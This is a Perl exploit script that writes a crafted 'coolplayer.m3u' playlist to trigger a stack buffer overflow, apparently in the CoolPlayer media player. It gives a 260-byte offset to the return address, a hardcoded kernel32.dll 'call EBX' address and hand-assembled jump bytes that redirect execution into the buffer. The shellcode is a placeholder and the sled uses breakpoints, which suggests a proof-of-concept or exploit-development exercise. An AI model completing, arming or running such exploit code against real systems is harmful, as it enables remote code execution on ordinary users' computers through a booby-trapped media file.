#!/usr/bin/perl

my $buffsize = 10000;             # set consistent buffer size

my $jmp = "\x83\xc3\x64" x 3;   # Add 300 to EBX which will jump beyond EIP overwrite and into NOPs + Shellcode
$jmp = $jmp . "\xff\xe3";   # jmp ebx

my $junk =  "\x41" x (260 - length($jmp));         # Offset to EIP
my $eip = pack('V', 0x7c810395);  # call EBX from kernel32.dll which points to start of buffer and our jump code

my $nops = "\xcc" x 50;
my $shellcode = "\x43" x 200;

my $sploit = $junk.$eip.$nops.$shellcode;	    # build sploit version of buffer
my $fill = "\x43" x ($buffsize - (length($sploit))); #fill remainder of buffer for size consistency
my $buffer = $sploit.$fill; # build final buffer

# Write Exploit Buffer to File
my $file = "coolplayer.m3u";
open(FILE, ">$file");
print FILE $buffer;
close(FILE);
print "Exploit file created [" . $file . "]\n";
print "Buffer Size: " . length($buffer) . "\n";



